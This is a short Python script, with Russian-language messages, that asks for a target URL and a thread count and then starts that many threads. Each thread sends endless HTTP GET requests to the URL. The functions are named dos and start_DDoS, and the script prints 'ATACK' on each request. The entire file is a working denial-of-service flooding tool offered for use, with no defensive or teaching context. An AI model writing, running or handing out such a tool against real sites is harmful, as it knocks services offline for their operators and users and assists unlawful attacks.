import colorama
import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.RED + "ATACK" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")

def start_DDoS():
    threads = 100

    url = input("URL: ")

    try:
        threads = int(input("Threads: "))
    except ValueError:
        exit("[!]Неверное количество потоков!")

    if threads == 0:
        exit("[!]Неверное количество потоков!")

    if not url.__contains__("http"):
        exit("[!]URL-адрес не содержит http или https!")

    if not url.__contains__("."):
        exit("[!]Неверный домен")

    for i in range(0, threads):
        thr = threading.Thread(target=dos, args=(url,))
        thr.start()
        print(str(i + 1) + " thread started!")
